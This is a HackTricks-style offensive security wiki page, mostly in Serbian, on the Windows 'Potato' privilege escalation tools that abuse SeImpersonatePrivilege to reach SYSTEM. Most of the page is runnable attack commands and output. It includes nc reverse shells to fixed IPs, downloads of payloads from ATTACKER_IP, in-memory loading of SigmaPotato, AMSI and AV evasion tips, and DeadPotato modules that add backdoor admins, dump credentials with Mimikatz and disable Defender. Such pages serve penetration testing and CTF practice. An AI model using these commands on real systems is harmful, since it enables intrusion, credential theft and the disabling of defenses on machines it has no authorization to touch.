# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato ne radi** na Windows Server 2019 i Windows 10 build 1809 i novijim. Međutim, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** mogu da se koriste za iskorišćavanje istih privilegija i dobijanje pristupa na nivou `NT AUTHORITY\SYSTEM`.** Ovaj [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) detaljno obrađuje `PrintSpoofer` alat, koji se može koristiti za zloupotrebu impersonation privilegija na Windows 10 i Server 2019 hostovima gde JuicyPotato više ne radi.

> [!TIP]
> Moderan alternativ koji se često održava u 2024–2025 je SigmaPotato (fork GodPotato) koji dodaje upotrebu in-memory/.NET reflection i proširenu podršku za OS. Pogledajte brzo uputstvo ispod i repo u References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Zahtevi i česti problemi

Sve sledeće tehnike oslanjaju se na zloupotrebu privilegovane usluge sposobne za impersonation iz konteksta koji poseduje jednu od ovih privilegija:

- SeImpersonatePrivilege (najčešće) ili SeAssignPrimaryTokenPrivilege
- Visok integritet nije neophodan ako token već ima SeImpersonatePrivilege (tipično za mnoge servisne naloge kao što su IIS AppPool, MSSQL, itd.)

Brzo proverite privilegije:
```cmd
whoami /priv | findstr /i impersonate
```
Operational notes:

- Ako vaš shell radi pod ograničenim tokenom bez SeImpersonatePrivilege (uobičajeno za Local Service/Network Service u nekim kontekstima), povratite podrazumevana privilegija naloga koristeći FullPowers, zatim pokrenite Potato. Primer: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer zahteva da Print Spooler servis radi i da mu se može pristupiti preko lokalne RPC krajnje tačke (spoolss). U pojačano zaštićenim okruženjima gde je Spooler onemogućen nakon PrintNightmare, pređnost dajte RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato zahteva OXID resolver dostupan na TCP/135. Ako je egress blokiran, koristite redirector/port-forwarder (see example below). Starije verzije su zahtevale -f parametar.
- EfsPotato/SharpEfsPotato zloupotrebljavaju MS-EFSR; ako je jedan pipe blokiran, probajte alternativne pipe-ove (lsarpc, efsrpc, samr, lsass, netlogon).
- Greška 0x6d3 tokom RpcBindingSetAuthInfo obično ukazuje na nepoznatu/nepodržanu RPC autentifikacionu uslugu; pokušajte drugi pipe/transport ili proverite da li ciljna usluga radi.
- “Kitchen-sink” forks kao što je DeadPotato uključuju dodatne payload module (Mimikatz/SharpHound/Defender off) koji zapisuju na disk; očekujte veću detekciju od strane EDR-a u poređenju sa tanjim originalima.

## Brzi demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Napomene:
- Možete koristiti -i za pokretanje interaktivnog procesa u trenutnoj konzoli, ili -c za izvršavanje jednolinijske naredbe.
- Zahteva Spooler servis. Ako je onemogućen, ovo neće uspeti.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Ako je outbound 135 blokiran, pivot the OXID resolver via socat na vašem redirectoru:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato je noviji primitiv zloupotrebe COM-a objavljen krajem 2022. koji cilja **PrintNotify** servis umesto Spooler/BITS. Binar instancira PrintNotify COM server, ubacuje lažni `IUnknown`, zatim pokreće privilegovani callback preko `CreatePointerMoniker`. Kada se PrintNotify servis (koji radi kao **SYSTEM**) poveže nazad, proces duplira vraćeni token i pokreće prosleđeni payload sa punim privilegijama.

Key operational notes:

* Radi na Windows 10/11 i Windows Server 2012–2022 sve dok je instaliran Print Workflow/PrintNotify servis (prisutan je čak i kada je legacy Spooler onemogućen nakon PrintNightmare).
* Zahteva da kontekst koji poziva ima **SeImpersonatePrivilege** (tipično za IIS APPPOOL, MSSQL i naloge servisnih zadataka).
* Prihvata ili direktnu komandu ili interaktivni režim tako da možete ostati u originalnoj konzoli. Primer:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Pošto je isključivo zasnovan na COM-u, nisu potrebni named-pipe listeners niti external redirectors, što ga čini drop-in replacement na hostovima gde Defender blokira RoguePotato’s RPC binding.

Operatori poput Ink Dragon pokreću PrintNotifyPotato odmah nakon što ostvare ViewState RCE na SharePoint-u, kako bi pivotovali sa `w3wp.exe` workera na SYSTEM pre instalacije ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Savet: Ako jedan pipe zakaže ili ga EDR blokira, probajte ostale podržane pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Napomene:
- Radi na Windows 8/8.1–11 i Server 2012–2022 kada je prisutan SeImpersonatePrivilege.
- Preuzmi binarni fajl koji odgovara instaliranom runtime-u (npr., `GodPotato-NET4.exe` na modernom Serveru 2022).
- Ako je tvoj početni execution primitive webshell/UI sa kratkim timeout-ima, postavi payload kao skriptu i zamoli GodPotato da je pokrene umesto duge inline komande.

Quick staging pattern from a writable IIS webroot:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato pruža dve varijante koje ciljaju servisne DCOM objekte koji su podrazumevano postavljeni na RPC_C_IMP_LEVEL_IMPERSONATE. Kompajlirajte ili koristite priložene binaries i pokrenite svoju naredbu:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (ažuriran fork GodPotato)

SigmaPotato dodaje savremene pogodnosti kao što su in-memory execution putem .NET reflection i PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- Ugrađeni reverse shell flag `--revshell` i uklanjanje 1024-znakovnog PowerShell ograničenja, tako da možete poslati duge AMSI-bypassing payloads odjednom.
- Sintaksa pogodna za reflection (`[SigmaPotato]::Main()`), plus prost trik za izbegavanje AV pomoću `VirtualAllocExNuma()` koji zbunjuje jednostavne heuristike.
- Odvojen `SigmaPotatoCore.exe` kompajliran za .NET 2.0 za okruženja PowerShell Core.

### DeadPotato (2024 GodPotato rework with modules)

DeadPotato zadržava GodPotato OXID/DCOM impersonation chain, ali ugrađuje post-exploitation helpere tako da operatori mogu odmah preuzeti SYSTEM i izvršiti persistence/collection bez dodatnih alata.

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — pokreće proizvoljnu komandu kao SYSTEM.
- `-rev <ip:port>` — brzi reverse shell.
- `-newadmin user:pass` — kreira lokalnog administratora za persistence.
- `-mimi sam|lsa|all` — dropuje i pokreće Mimikatz da dumpuje kredencijale (piše na disk, bučno).
- `-sharphound` — pokreće SharpHound collection kao SYSTEM.
- `-defender off` — gasi Defender real-time protection (veoma bučno).

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Zbog toga što isporučuje dodatne binaries, očekujte više AV/EDR flags; koristite tanji GodPotato/SigmaPotato kada je stealth važan.

## References

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [HTB: Job — LibreOffice macro → IIS webshell → GodPotato to SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
